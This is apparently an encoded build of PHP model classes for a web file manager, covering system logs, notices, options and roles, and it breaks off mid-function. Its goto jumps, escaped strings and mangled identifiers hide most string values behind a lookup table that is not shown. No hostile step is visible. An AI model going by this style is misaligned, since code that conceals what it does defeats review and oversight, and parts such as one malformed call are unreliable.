<?php
 goto Cµ˜«šïÃÀ; e³ù¼ïÊÓÒ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\x2e\x4c\151\147\150\x74\101\x70\x70"; public $modelType = "\123\171\163\164\x65\155\117\x70\164\151\157\x6e"; public $field = array("\x6e\x61\x6d\145", "\x67\x72\157\165\x70", "\144\145\163\x63", "\x63\x6f\156\x74\x65\156\x74"); public function listData($è¨ÌÜ÷ = false, $µ”äİôò = "\155\x6f\x64\151\x66\171\124\x69\x6d\x65", $íÓÁÀûÄ = true) { return parent::listData($è¨ÌÜ÷, $µ”äİôò, $íÓÁÀûÄ); } public function remove($½–Ç‘ó) { $¨¶ÑÓø  = $this->findByName($½–Ç‘ó); if (!$¨¶ÑÓø ) { return !1; } return parent::remove($¨¶ÑÓø [$_SERVER[ÔÕ±ĞšÎ][477]]); } public function add($ãö—©‰î) { if ($this->findByName($ãö—©‰î[$_SERVER[ÔÕ±ĞšÎ][32]])) { return !1; } return parent::insert($ãö—©‰î); } public function update($Î–«Ò£¥, $İÁ³„”ú) { $®ç…¸ä =& $_SERVER[ÔÕ±ĞšÎ]; $±Äš½ˆÃ = $this->findByName($Î–«Ò£¥); $õ²‚€… = $this->findByName($İÁ³„”ú[$®ç…¸ä[32]]); if (!$±Äš½ˆÃ || $õ²‚€… && $õ²‚€…[$®ç…¸ä[477]] != $±Äš½ˆÃ[$®ç…¸ä[477]]) { return !1; } return parent::update($±Äš½ˆÃ[$®ç…¸ä[477]], $İÁ³„”ú); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\164\x65\x6d\x5f\x6c\157\147"; protected $dataAuto = array(array("\x63\162\145\x61\164\145\x54\x69\155\145", "\x74\151\x6d\145", "\x69\x6e\x73\145\162\164", "\x66\165\x6e\143\164\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ğÑíúİİ =& $_SERVER[ÔÕ±ĞšÎ]; return array($ğÑíúİİ[2348] => LNG($ğÑíúİİ[2349]), $ğÑíúİİ[2350] => LNG($ğÑíúİİ[2351]), $ğÑíúİİ[1920] => LNG($ğÑíúİİ[2352]), $ğÑíúİİ[2353] => LNG($ğÑíúİİ[2354]), $ğÑíúİİ[2355] => LNG($ğÑíúİİ[2356]), $ğÑíúİİ[2357] => LNG($ğÑíúİİ[2358]), $ğÑíúİİ[2359] => LNG($ğÑíúİİ[2360]), $ğÑíúİİ[1950] => LNG($ğÑíúİİ[2360]), $ğÑíúİİ[1951] => LNG($ğÑíúİİ[2361]), $ğÑíúİİ[2362] => LNG($ğÑíúİİ[2363]), $ğÑíúİİ[2364] => LNG($ğÑíúİİ[2365]), $ğÑíúİİ[2366] => LNG($ğÑíúİİ[2367]), $ğÑíúİİ[2368] => LNG($ğÑíúİİ[2369]), $ğÑíúİİ[1948] => LNG($ğÑíúİİ[2370]), $ğÑíúİİ[2371] => LNG($ğÑíúİİ[2372]), $ğÑíúİİ[1955] => LNG($ğÑíúİİ[2373]), $ğÑíúİİ[2374] => LNG($ğÑíúİİ[2375]), $ğÑíúİİ[2376] => LNG($ğÑíúİİ[2377]), $ğÑíúİİ[2378] => LNG($ğÑíúİİ[2379]), $ğÑíúİİ[2380] => LNG($ğÑíúİİ[2381]), $ğÑíúİİ[1958] => LNG($ğÑíúİİ[2382]), $ğÑíúİİ[1959] => LNG($ğÑíúİİ[2383]), $ğÑíúİİ[2384] => LNG($ğÑíúİİ[2385]), $ğÑíúİİ[2386] => LNG($ğÑíúİİ[2387]), $ğÑíúİİ[2388] => LNG($ğÑíúİİ[2389]), $ğÑíúİİ[1953] => LNG($ğÑíúİİ[2390]), $ğÑíúİİ[2391] => LNG($ğÑíúİİ[2392]), $ğÑíúİİ[1952] => LNG($ğÑíúİİ[2393]), $ğÑíúİİ[2394] => LNG($ğÑíúİİ[2395]), $ğÑíúİİ[2396] => LNG($ğÑíúİİ[2397]), $ğÑíúİİ[2398] => LNG($ğÑíúİİ[2397]), $ğÑíúİİ[2399] => LNG($ğÑíúİİ[2400]), $ğÑíúİİ[2401] => LNG($ğÑíúİİ[2401]), $ğÑíúİİ[2402] => LNG($ğÑíúİİ[1924]), $ğÑíúİİ[2403] => LNG($ğÑíúİİ[2404]), $ğÑíúİİ[2405] => LNG($ğÑíúİİ[2406]), $ğÑíúİİ[2407] => LNG($ğÑíúİİ[2408]), $ğÑíúİİ[2409] => LNG($ğÑíúİİ[2410]), $ğÑíúİİ[2411] => LNG($ğÑíúİİ[2412]), $ğÑíúİİ[2413] => LNG($ğÑíúİİ[2413]), $ğÑíúİİ[2414] => LNG($ğÑíúİİ[2415]), $ğÑíúİİ[2416] => LNG($ğÑíúİİ[2417]), $ğÑíúİİ[2418] => LNG($ğÑíúİİ[2419]), $ğÑíúİİ[2420] => LNG($ğÑíúİİ[2421]), $ğÑíúİİ[2422] => LNG($ğÑíúİİ[2423]), $ğÑíúİİ[2424] => LNG($ğÑíúİİ[2425]), $ğÑíúİİ[212] => LNG($ğÑíúİİ[212]), $ğÑíúİİ[213] => LNG($ğÑíúİİ[2426]), $ğÑíúİİ[2427] => LNG($ğÑíúİİ[2427])); } private function typeFile() { $İœá¾ =& $_SERVER[ÔÕ±ĞšÎ]; $èÈêšÌ = array($İœá¾[1955] => array($İœá¾[1956]), $İœá¾[2366] => array($İœá¾[2428]), $İœá¾[2368] => array($İœá¾[2429]), $İœá¾[1948] => array($İœá¾[1949], $İœá¾[2430]), $İœá¾[2376] => array(), $İœá¾[2378] => array(), $İœá¾[2380] => array(), $İœá¾[1958] => array($İœá¾[1960]), $İœá¾[1959] => array($İœá¾[1960]), $İœá¾[2384] => array($İœá¾[2431]), $İœá¾[2386] => array($İœá¾[2431]), $İœá¾[2388] => array($İœá¾[2432]), $İœá¾[2374] => array($İœá¾[2433]), $İœá¾[1953] => array($İœá¾[2434]), $İœá¾[2391] => array($İœá¾[2435]), $İœá¾[1952] => array($İœá¾[1954])); return $èÈêšÌ; } private function typeAll() { $øœÇ½½— =& $_SERVER[ÔÕ±ĞšÎ]; $›…éĞ¥— = $this->typeList; $—äÁñ˜× = array_filter($this->typeFile()); foreach ($—äÁñ˜× as $œéßÇê´ => $¢ãª†øß) { $›…éĞ¥—[$¢ãª†øß[0]] = $›…éĞ¥—[$œéßÇê´]; } $›…éĞ¥—[$øœÇ½½—[1960]] = LNG($øœÇ½½—[2436]); $›…éĞ¥—[$øœÇ½½—[2431]] = LNG($øœÇ½½—[2437]); return $›…éĞ¥—; } public function addLog($éå¶¾ÅÒ, $åãÛÃÑÚ = array()) { $Ù“Úˆ„Ş =& $_SERVER[ÔÕ±ĞšÎ]; if (!isset($this->typeList[$éå¶¾ÅÒ])) { return; } $ËÂÑıô  = Session::get($Ù“Úˆ„Ş[2120]); if (!$ËÂÑıô ) { $ËÂÑıô  = _get($åãÛÃÑÚ, $Ù“Úˆ„Ş[1777], 0); } if ($éå¶¾ÅÒ == $Ù“Úˆ„Ş[2403] && is_array($åãÛÃÑÚ[$Ù“Úˆ„Ş[2438]]) && !$åãÛÃÑÚ[$Ù“Úˆ„Ş[2438]]) { return; } $¤Ø³› = get_client_ip(); if (!$åãÛÃÑÚ || strlen(json_encode($åãÛÃÑÚ)) >= 1024 * 64) { if ($åãÛÃÑÚ && is_array($åãÛÃÑÚ)) { $åãÛÃÑÚ = array_intersect_key($åãÛÃÑÚ, array_flip($Ù“Úˆ„Ş[477], $Ù“Úˆ„Ş[32])); $åãÛÃÑÚ[$Ù“Úˆ„Ş[2439]] = $¤Ø³›; } else { $åãÛÃÑÚ = array($Ù“Úˆ„Ş[2439] => $¤Ø³›); } } else { if (is_array($åãÛÃÑÚ)) { $åãÛÃÑÚ[$Ù“Úˆ„Ş[2439]] = $¤Ø³›; } else { $åãÛÃÑÚ = array($Ù“Úˆ„Ş[1289] => $åãÛÃÑÚ, $Ù“Úˆ„Ş[2439] => $¤Ø³›); } } $åãÛÃÑÚ = array($Ù“Úˆ„Ş[1767] => Session::sign(), $Ù“Úˆ„Ş[1768] => intval($ËÂÑıô ), $Ù“Úˆ„Ş[33] => $éå¶¾ÅÒ, $Ù“Úˆ„Ş[1770] => json_encode($åãÛÃÑÚ)); return parent::add($åãÛÃÑÚ); } public function remove($ğè¨’Ò») { $this->where(array($_SERVER[ÔÕ±ĞšÎ][495] => $ğè¨’Ò»))->delete(); } private function _makeOrder($æ ¸·éç = '') { $”›³• İ =& $_SERVER[ÔÕ±ĞšÎ]; $×…ºş´ò = $”›³• İ[233]; $æ…çñÒÌ = array($”›³• İ[525] => $”›³• İ[526], $”›³• İ[527] => $”›³• İ[528]); $–æıëî‹ = Input::get($”›³• İ[533], $”›³• İ[7], $”›³• İ[2157], array($”›³• İ[2074], $”›³• İ[527])); $–æıëî‹ = $æ…çñÒÌ[$–æıëî‹]; $æ ¸·éç = $æ ¸·éç . "{$×…ºş´ò}\x20{$–æıëî‹}"; return $this->order($æ ¸·éç); } public function get($˜‘ÀÕåÓ = '') { $½ŠªÚøÕ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$˜‘ÀÕåÓ) { show_json(array()); } $–‚’›£• = array(); if ($˜‘ÀÕåÓ[$½ŠªÚøÕ[1777]]) { $–‚’›£•[$½ŠªÚøÕ[1777]] = $˜‘ÀÕåÓ[$½ŠªÚøÕ[1777]]; } if (isset($˜‘ÀÕåÓ[$½ŠªÚøÕ[834]])) { $ªü’§ = $˜‘ÀÕåÓ[$½ŠªÚøÕ[834]]; $„Ë³´ö† = isset($˜‘ÀÕåÓ[$½ŠªÚøÕ[835]]) ? $˜‘ÀÕåÓ[$½ŠªÚøÕ[835]] : time(); $–‚’›£•[$½ŠªÚøÕ[233]] = array($½ŠªÚøÕ[410], array($ªü’§, $„Ë³´ö†)); } if ($˜‘ÀÕåÓ[$½ŠªÚøÕ[33]]) { $¶’µıÂ = explode($½ŠªÚøÕ[50], $˜‘ÀÕåÓ[$½ŠªÚøÕ[33]]); $ÓÏ€¥à” = $this->typeFile(); $Ÿ­”¼…Ş = array(); foreach ($¶’µıÂ as $²ÕÓÉŸ) { $Ÿ­”¼…Ş[] = $²ÕÓÉŸ; if (isset($ÓÏ€¥à”[$²ÕÓÉŸ])) { $Ÿ­”¼…Ş = array_merge($Ÿ­”¼…Ş, $ÓÏ€¥à”[$²ÕÓÉŸ]); } } $Ÿ­”¼…Ş = array_unique($Ÿ­”¼…Ş); if ($Ÿ­”¼…Ş) { $–‚’›£•[$½ŠªÚøÕ[33]] = array($½ŠªÚøÕ[7], $Ÿ­”¼…Ş); } } else { $–‚’›£•[$½ŠªÚøÕ[33]] = array($½ŠªÚøÕ[2440], $½ŠªÚøÕ[2441]); } if (!empty($˜‘ÀÕåÓ[$½ŠªÚøÕ[2439]])) { $–‚’›£•[$½ŠªÚøÕ[528]] = array($½ŠªÚøÕ[461], "\x25{$˜‘ÀÕåÓ[$½ŠªÚøÕ[2439]]}\x25"); } $É»¤†Õ = $this->_makeOrder()->where($–‚’›£•)->selectPage(); if (empty($É»¤†Õ[$½ŠªÚøÕ[447]])) { show_json(array(), !0, $É»¤†Õ[$½ŠªÚøÕ[444]]); } $É»¤†Õ[$½ŠªÚøÕ[447]] = $this->logList($É»¤†Õ[$½ŠªÚøÕ[447]]); return $É»¤†Õ; } private function ipAddress(&$Š×øñÃ—) { $ıºşË© =& $_SERVER[ÔÕ±ĞšÎ]; if (!empty($Š×øñÃ—[$ıºşË©[2439]])) { $æ—ÜŞ×¢ = IpLocation::get($Š×øñÃ—[$ıºşË©[2439]]); } else { $æ—ÜŞ×¢ = LNG($ıºşË©[2442]); } $Š×øñÃ—[$ıºşË©[2443]] = $æ—ÜŞ×¢; } private function descZipDownload($Ğîî¶úÏ, &$ÄÜ‹¬ˆø) { $äÜâ“ÁĞ =& $_SERVER[ÔÕ±ĞšÎ]; if (!isset($Ğîî¶úÏ[$äÜâ“ÁĞ[2444]])) { return; } $”½÷…²´ = json_decode($Ğîî¶úÏ[$äÜâ“ÁĞ[2444]], !0); foreach ($”½÷…²´ as $–ÉşÑŞÚ) { try { $Ç¸Ö²„ã = IO::infoFullSimple($–ÉşÑŞÚ[$äÜâ“ÁĞ[87]]); } catch (Exception $€ÕŸ®‡) { continue; } $Ğîî¶úÏ[$äÜâ“ÁĞ[87]] = $–ÉşÑŞÚ[$äÜâ“ÁĞ[87]]; $ÄÜ‹¬ˆø[] = $Ğîî¶úÏ[$äÜâ“ÁĞ[193]] = $Ç¸Ö²„ã[$äÜâ“ÁĞ[193]]; $ÄÜ‹¬ˆø[] = $Ğîî¶úÏ[$äÜâ“ÁĞ[2213]] = $Ç¸Ö²„ã[$äÜâ“ÁĞ[192]]; break; } return $Ğîî¶úÏ; } private function getSourceList(&$§şä«äë) { $®“¾êÕ“ =& $_SERVER[ÔÕ±ĞšÎ]; $Ô¦°¼› = array(); foreach ($§şä«äë as $İ’Ó³ => $Úß ´‡) { $—‚ñÂæ» = json_decode($Úß ´‡[$®“¾êÕ“[528]], !0); if ($Úß ´‡[$®“¾êÕ“[33]] == $®“¾êÕ“[1951]) { $—‚ñÂæ» = $this->descZipDownload($—‚ñÂæ», $Ô¦°¼›); $§şä«äë[$İ’Ó³][$®“¾êÕ“[528]] = json_encode($—‚ñÂæ»); continue; } if (strpos($Úß ´‡[$®“¾êÕ“[33]], $®“¾êÕ“[2215]) !== 0) { if (!isset($—‚ñÂæ»[$®“¾êÕ“[87]]) || strpos($Úß ´‡[$®“¾êÕ“[33]], $®“¾êÕ“[2445]) !== 0) { continue; } try { $Îşùç• = IO::infoFullSimple($—‚ñÂæ»[$®“¾êÕ“[87]]); } catch (Exception $³È§ã…Ş) { continue; } $Ô¦°¼›[] = $—‚ñÂæ»[$®“¾êÕ“[193]] = $Îşùç•[$®“¾êÕ“[193]]; $Ô¦°¼›[] = $—‚ñÂæ»[$®“¾êÕ“[2213]] = $Îşùç•[$®“¾êÕ“[192]]; $§şä«äë[$İ’Ó³][$®“¾êÕ“[528]] = json_encode($—‚ñÂæ»); continue; } $Ô¦°¼›[] = $—‚ñÂæ»[$®“¾êÕ“[193]]; $Ô¦°¼›[] = $—‚ñÂæ»[$®“¾êÕ“[2213]]; if ($—‚ñÂæ»[$®“¾êÕ“[33]] == $®“¾êÕ“[625]) { $Ô¦°¼›[] = $—‚ñÂæ»[$®“¾êÕ“[528]][$®“¾êÕ“[1243]]; $Ô¦°¼›[] = $—‚ñÂæ»[$®“¾êÕ“[528]][$®“¾êÕ“[1244]]; } if ($—‚ñÂæ»[$®“¾êÕ“[33]] == $®“¾êÕ“[2224]) { $Ô¦°¼›[] = $—‚ñÂæ»[$®“¾êÕ“[528]][$®“¾êÕ“[193]]; } } if (!$Ô¦°¼›) { return array(); } return Model($®“¾êÕ“[899])->sourceListInfo($Ô¦°¼›, !0); } private function logList($”‹“â²Ä) { $ËŞõë¾” =& $_SERVER[ÔÕ±ĞšÎ]; $˜¬”™ª = array_to_keyvalue($”‹“â²Ä, $ËŞõë¾”[12], $ËŞõë¾”[1777]); $ËçèŒ€˜ = Model($ËŞõë¾”[599])->userListInfo(array_unique($˜¬”™ª)); $¨˜ÄÉŞÕ = $this->getSourceList($”‹“â²Ä); $©»ï¨åÚ = $this->typeAll(); $â·÷Àï = array(); $ë…¢Ãñ = array(); foreach ($”‹“â²Ä as $Ä§ŸëÔ => $ø’›Ò) { $îÙ«Ç¥î = $ø’›Ò[$ËŞõë¾”[33]]; $ÎŒ¿íÚ… = isset($ËçèŒ€˜[$ø’›Ò[$ËŞõë¾”[1777]]]) ? $ËçèŒ€˜[$ø’›Ò[$ËŞõë¾”[1777]]] : !1; $šù©íı• = strpos($îÙ«Ç¥î, $ËŞõë¾”[2446]) === 0 ? LNG($ËŞõë¾”[2447]) : LNG($ËŞõë¾”[2442]); $ø’›Ò[$ËŞõë¾”[32]] = isset($ÎŒ¿íÚ…[$ËŞõë¾”[32]]) ? $ÎŒ¿íÚ…[$ËŞõë¾”[32]] : LNG($ËŞõë¾”[2442]); $ø’›Ò[$ËŞõë¾”[2274]] = isset($ÎŒ¿íÚ…[$ËŞõë¾”[2274]]) ? $ÎŒ¿íÚ…[$ËŞõë¾”[2274]] : $ËŞõë¾”[12]; $ø’›Ò[$ËŞõë¾”[1665]] = isset($©»ï¨åÚ[$îÙ«Ç¥î]) ? $©»ï¨åÚ[$îÙ«Ç¥î] : $šù©íı•; $ø’›Ò[$ËŞõë¾”[2156]] = $ÎŒ¿íÚ…; $¤ˆø„Å’ = json_decode($ø’›Ò[$ËŞõë¾”[528]], !0); $ø’›Ò[$ËŞõë¾”[2439]] = isset($¤ˆø„Å’[$ËŞõë¾”[2439]]) ? $¤ˆø„Å’[$ËŞõë¾”[2439]] : $ËŞõë¾”[12]; $ø’›Ò[$ËŞõë¾”[2443]] = IpLocation::get($ø’›Ò[$ËŞõë¾”[2439]]); if (strpos($îÙ«Ç¥î, $ËŞõë¾”[2215]) === 0 || isset($¤ˆø„Å’[$ËŞõë¾”[2213]])) { $¤ˆø„Å’[$ËŞõë¾”[90]] = $¨˜ÄÉŞÕ[$¤ˆø„Å’[$ËŞõë¾”[193]]]; $¤ˆø„Å’[$ËŞõë¾”[2229]] = $¨˜ÄÉŞÕ[$¤ˆø„Å’[$ËŞõë¾”[2213]]]; if ($¤ˆø„Å’[$ËŞõë¾”[33]] == $ËŞõë¾”[625]) { $¤ˆø„Å’[$ËŞõë¾”[528]][$ËŞõë¾”[1243]] = $¨˜ÄÉŞÕ[$¤ˆø„Å’[$ËŞõë¾”[528]][$ËŞõë¾”[1243]]]; $¤ˆø„Å’[$ËŞõë¾”[528]][$ËŞõë¾”[1244]] = $¨˜ÄÉŞÕ[$¤ˆø„Å’[$ËŞõë¾”[528]][$ËŞõë¾”[1244]]]; } if ($¤ˆø„Å’[$ËŞõë¾”[33]] == $ËŞõë¾”[2224]) { $¤ˆø„Å’[$ËŞõë¾”[528]][$ËŞõë¾”[193]] = $¨˜ÄÉŞÕ[$¤ˆø„Å’[$ËŞõë¾”[528]][$ËŞõë¾”[193]]]; } if ($¤ˆø„Å’[$ËŞõë¾”[33]] == $ËŞõë¾”[1946]) { $¤ˆø„Å’[$ËŞõë¾”[2229]] = $¤ˆø„Å’[$ËŞõë¾”[90]]; $¤ˆø„Å’[$ËŞõë¾”[2213]] = $¤ˆø„Å’[$ËŞõë¾”[2229]][$ËŞõë¾”[193]]; $¤ˆø„Å’[$ËŞõë¾”[90]] = !1; $¤ˆø„Å’[$ËŞõë¾”[193]] = $ËŞõë¾”[12]; } $›ô¶©ë = array($ËŞõë¾”[1946], $ËŞõë¾”[2211]); if (!in_array($¤ˆø„Å’[$ËŞõë¾”[33]], $›ô¶©ë)) { if ($¤ˆø„Å’[$ËŞõë¾”[90]] && $¤ˆø„Å’[$ËŞõë¾”[90]][$ËŞõë¾”[190]] == $ËŞõë¾”[191]) { $ë…¢Ãñ[] = $ø’›Ò[$ËŞõë¾”[477]]; unset($”‹“â²Ä[$Ä§ŸëÔ]); continue; } if ($¤ˆø„Å’[$ËŞõë¾”[2229]] && $¤ˆø„Å’[$ËŞõë¾”[2229]][$ËŞõë¾”[190]] == $ËŞõë¾”[191]) { $ë…¢Ãñ[] = $ø’›Ò[$ËŞõë¾”[477]]; unset($”‹“â²Ä[$Ä§ŸëÔ]); continue; } } } $ø’›Ò[$ËŞõë¾”[528]] = $¤ˆø„Å’; unset($ø’›Ò[$ËŞõë¾”[2448]]); $â·÷Àï[] = $ø’›Ò; } $this->clearSystemPathLog($ë…¢Ãñ); return $â·÷Àï; } private function clearSystemPathLog($Â‡óÈå¤) { $‰®ò¦İæ =& $_SERVER[ÔÕ±ĞšÎ]; if (count($Â‡óÈå¤) == 0) { return; } $ÃÜš°ı = array($‰®ò¦İæ[477] => array($‰®ò¦İæ[7], array_unique($Â‡óÈå¤))); $this->where($ÃÜš°ı)->delete(); } public function deviceList($çÕéİ, $²ò³¿˜Ğ = 0) { $Ú­¹èé =& $_SERVER[ÔÕ±ĞšÎ]; $ñ‹¢Åú¨ = array($Ú­¹èé[1777] => $çÕéİ, $Ú­¹èé[233] => array($Ú­¹èé[1093], $²ò³¿˜Ğ), $Ú­¹èé[33] => $Ú­¹èé[1920]); $è¸Ï½Á‰ = array(); $¼ìÒ Ëè = $this->field($Ú­¹èé[2449])->where($ñ‹¢Åú¨)->order($Ú­¹èé[2227])->limit(50)->select(); foreach ($¼ìÒ Ëè as $±õö–¼Ú => $üÉ»­) { if ($±õö–¼Ú > 0 && abs($üÉ»­[$Ú­¹èé[233]] - $¼ìÒ Ëè[$±õö–¼Ú - 1][$Ú­¹èé[233]]) < 5) { continue; } $õÁ‡¹ÖŞ = json_decode($üÉ»­[$Ú­¹èé[528]], !0); $üÉ»­[$Ú­¹èé[2439]] = isset($õÁ‡¹ÖŞ[$Ú­¹èé[2439]]) ? $õÁ‡¹ÖŞ[$Ú­¹èé[2439]] : $Ú­¹èé[12]; unset($õÁ‡¹ÖŞ[$Ú­¹èé[2439]]); $ã’¿öÓ÷ = $this->deviceType($õÁ‡¹ÖŞ[$Ú­¹èé[2216]]); if (isset($è¸Ï½Á‰[$ã’¿öÓ÷])) { continue; } $üÉ»­[$Ú­¹èé[2443]] = IpLocation::get($üÉ»­[$Ú­¹èé[2439]]); $üÉ»­[$Ú­¹èé[528]] = $õÁ‡¹ÖŞ; $è¸Ï½Á‰[$ã’¿öÓ÷] = $üÉ»­; } return array_values($è¸Ï½Á‰); } public function deviceType($å»…ëõò) { return $å»…ëõò; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\156\x6f\x74\151\x63\145\x4c\x69\163\x74"; public $field = array("\156\x61\x6d\x65", "\x63\x6f\156\x74\145\156\164", "\141\165\x74\x68", "\x6d\x6f\x64\x65", "\x74\x69\x6d\x65", "\x74\171\x70\145", "\x6c\145\166\145\154", "\x65\x6e\x61\142\154\x65", "\x73\157\162\x74"); public function listData($Ğ™Æô±¹ = false, $Á²Èç·— = "\x73\157\162\164", $ŸÎÉç‹ï = false) { return parent::listData($Ğ™Æô±¹, $Á²Èç·—, $ŸÎÉç‹ï); } public function add($¸·ÄàÔ) { $„íáÊÍø =& $_SERVER[ÔÕ±ĞšÎ]; $İ¢±¿µ = time(); if ($¸·ÄàÔ[$„íáÊÍø[16]] == $„íáÊÍø[2450]) { $İ¢±¿µ = strtotime($¸·ÄàÔ[$„íáÊÍø[206]]); } $¸·ÄàÔ[$„íáÊÍø[206]] = $İ¢±¿µ; return parent::insert($¸·ÄàÔ); } public function update($‰®€èºõ, $œˆ™¼‡¬) { $ã¥ÎÜÜ =& $_SERVER[ÔÕ±ĞšÎ]; $‘¸ö¢–õ = $this->listData($‰®€èºõ); if (!$‘¸ö¢–õ) { return !1; } $ÎùÖ©üÒ = time(); if ($œˆ™¼‡¬[$ã¥ÎÜÜ[16]] == $ã¥ÎÜÜ[2450]) { $ÎùÖ©üÒ = strtotime($œˆ™¼‡¬[$ã¥ÎÜÜ[206]]); } $œˆ™¼‡¬[$ã¥ÎÜÜ[206]] = $ÎùÖ©üÒ; return parent::update($‰®€èºõ, $œˆ™¼‡¬); } public function remove($àÔ‡†à½) { $¾İ‹Ğ = $this->listData($àÔ‡†à½); if (!$¾İ‹Ğ || $¾İ‹Ğ[$_SERVER[ÔÕ±ĞšÎ][191]]) { return !1; } return parent::remove($àÔ‡†à½); } public function sort($¸á˜§ç£, $‹»ù¶­€) { return parent::update($¸á˜§ç£, $‹»ù¶­€); } public function enable($öÔÃÕµ­, $êÍ¡¨ñÍ) { return parent::update($öÔÃÕµ­, array($_SERVER[ÔÕ±ĞšÎ][2451] => $êÍ¡¨ñÍ)); } private function initUserOption() { $ŸÉƒ·æä =& $_SERVER[ÔÕ±ĞšÎ]; $this->optionType = $ŸÉƒ·æä[2452]; $this->modelType = $ŸÉƒ·æä[2453]; $this->field = array($ŸÉƒ·æä[2454], $ŸÉƒ·æä[32], $ŸÉƒ·æä[206], $ŸÉƒ·æä[33], $ŸÉƒ·æä[2455], $ŸÉƒ·æä[824], $ŸÉƒ·æä[228]); } public function userNoticeGet($Ü¬¥›¹ = false) { $this->initUserOption(); return parent::listData($Ü¬¥›¹, $_SERVER[ÔÕ±ĞšÎ][477], !0); } public function userNoticeAdd($¨ıÕÕ±Õ) { $Çºš˜° =& $_SERVER[ÔÕ±ĞšÎ]; $this->initUserOption(); $ú±Ç•‡Ê = $this->findByKey($Çºš˜°[2454], $¨ıÕÕ±Õ[$Çºš˜°[477]]); if ($ú±Ç•‡Ê) { return !0; } $÷Ş‚áÅ = array($Çºš˜°[2454] => $¨ıÕÕ±Õ[$Çºš˜°[477]], $Çºš˜°[32] => $¨ıÕÕ±Õ[$Çºš˜°[32]], $Çºš˜°[206] => $¨ıÕÕ±Õ[$Çºš˜°[206]], $Çºš˜°[33] => isset($¨ıÕÕ±Õ[$Çºš˜°[33]]) ? $¨ıÕÕ±Õ[$Çºš˜°[33]] : 1, $Çºš˜°[2455] => isset($¨ıÕÕ±Õ[$Çºš˜°[2455]]) ? $¨ıÕÕ±Õ[$Çºš˜°[2455]] : 0, $Çºš˜°[824] => 0, $Çºš˜°[228] => 0); return parent::insert($÷Ş‚áÅ); } public function userNoticeEdit($Šá í±ß, $öİœÆÒÖ) { $this->initUserOption(); return parent::update($Šá í±ß, $öİœÆÒÖ); } } goto EÏ¼³¶ğ»Ñ; EÏ¼³¶ğ»Ñ: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\164\145\x6d\137\157\160\x74\151\x6f\x6e"; protected $jsonField = array("\155\x65\x6e\x75", "\x72\157\x6c\145", "\162\x6f\154\145\x47\x72\x6f\165\160", "\162\145\x67\151\163\164", "\145\x6d\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($œ°³Éİ…) { return "\x53\x79\163\x74\145\x6d\x4f\160\164\x69\x6f\156\137{$œ°³Éİ…}"; } protected function optionDefault($ææ—ùÍÂ = '') { $óğöµ® =& $_SERVER[ÔÕ±ĞšÎ]; if ($ææ—ùÍÂ == $óğöµ®[12]) { return $GLOBALS[$óğöµ®[6]][$óğöµ®[459]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\56\x72\x6f\154\145\x4c\x69\x73\164"; public $field = array("\x6e\141\155\145", "\x61\x75\164\x68", "\x6c\141\142\x65\154", "\144\x69\x73\160\x6c\141\171", "\x73\x79\163\x74\145\155", "\x64\145\x73\143", "\151\147\156\x6f\162\x65\105\170\164", "\151\x67\x6e\x6f\162\145\x46\x69\x6c\145\x53\x69\x7a\145", "\141\144\x6d\151\156\151\x73\x74\x72\x61\164\157\162", "\163\157\162\164"); public function listData($´Óºªñ = false, $ˆè¹ß‹„ = "\163\157\162\164", $ó©–·º¸ = false) { $ª‚Æç·’ =& $_SERVER[ÔÕ±ĞšÎ]; $ÜÊƒ—åê = parent::listData($´Óºªñ, $ˆè¹ß‹„, $ó©–·º¸); if (!$´Óºªñ) { foreach ($ÜÊƒ—åê as $¶™ã´›Ô => $Ó†Ïê§) { if ($Ó†Ïê§[$ª‚Æç·’[2187]] == 1) { $ÜÊƒ—åê[$¶™ã´›Ô][$ª‚Æç·’[528]] = LNG($ª‚Æç·’[2456]); } } } return $ÜÊƒ—åê; } public function update($‹–¼š’ë, $½½İ£ñ°) { $™÷»øÔÂ =& $_SERVER[ÔÕ±ĞšÎ]; $†ñì«­Ù = parent::listData($‹–¼š’ë); $¦‡Ë»ü = $this->findByName($½½İ£ñ°[$™÷»øÔÂ[32]]); if (!$†ñì«­Ù || $¦‡Ë»ü && $¦‡Ë»ü[$™÷»øÔÂ[477]] != $†ñì«­Ù[$™÷»øÔÂ[477]]) { return !1; } if ($¦‡Ë»ü[$™÷»øÔÂ[2187]] == 1) { $½½İ£ñ° = array($™÷»øÔÂ[32] => $½½İ£ñ°[$™÷»øÔÂ[32]], $™÷»øÔÂ[2001] => $½½İ£ñ°[$™÷»øÔÂ[2001]]); } $this->filterAuth($½½İ£ñ°[$™÷»øÔÂ[489]]); return parent::update($‹–¼š’ë, $½½İ£ñ°); } public function remove($‘ã·×•) { $¸éûáŞ· = parent::listData($‘ã·×•); if (!$¸éûáŞ· || $¸éûáŞ·[$_SERVER[ÔÕ±ĞšÎ][191]]) { return !1; } return parent::remove($‘ã·×•); } public function add($¯ª†ê¡) { $¸õÃäÎ =& $_SERVER[ÔÕ±ĞšÎ]; $ìÛŸóÕİ = $¯ª†ê¡[$¸õÃäÎ[32]]; if ($this->findByName($ìÛŸóÕİ)) { return !1; } $ª¦¶¿Ä¢ = array($¸õÃäÎ[496] => $ìÛŸóÕİ, $¸õÃäÎ[1984] => $¸õÃäÎ[12], $¸õÃäÎ[1980] => $¸õÃäÎ[1988], $¸õÃäÎ[2457] => 1, $¸õÃäÎ[1983] => 0, $¸õÃäÎ[2458] => 0, $¸õÃäÎ[1982] => $this->getSort()); $¯ª†ê¡ = array_merge($ª¦¶¿Ä¢, $¯ª†ê¡); $this->filterAuth($¯ª†ê¡[$¸õÃäÎ[489]]); return parent::insert($¯ª†ê¡); } private function getSort() { $šÙ£¬¡ =& $_SERVER[ÔÕ±ĞšÎ]; $ÜÕ“¬€« = parent::listData(); $™™ü‚ŒÀ = array_to_keyvalue($ÜÕ“¬€«, $šÙ£¬¡[12], $šÙ£¬¡[2002]); return empty($™™ü‚ŒÀ) ? 0 : max($™™ü‚ŒÀ) + 1; } private function filterAuth(&$å€İšæ•) { $ÄÃ¹ßéş =& $_SERVER[ÔÕ±ĞšÎ]; $Ù†óé§† = array(); 